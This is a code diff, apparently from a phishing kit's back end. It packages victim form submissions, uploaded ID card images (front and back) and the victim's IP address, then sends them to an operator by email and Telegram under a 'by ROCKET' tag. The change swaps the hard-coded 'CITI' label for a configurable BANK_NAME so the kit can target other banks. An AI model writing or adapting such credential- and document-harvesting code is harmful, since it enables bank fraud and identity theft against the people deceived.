@@ -154,7 +154,7 @@ ${
     if (process.env.TO) {
       await sendEmail(
         message,
-        `CITI - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`,
+        `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`,
         req.files && (front || back)
           ? [
               {
@@ -187,7 +187,7 @@ ${
     if (process.env.TELEGRAM_ID) {
       await sendTelegram({
         message: `
-        CITI - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
+        ${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
         ${message}
       `,
         medias:
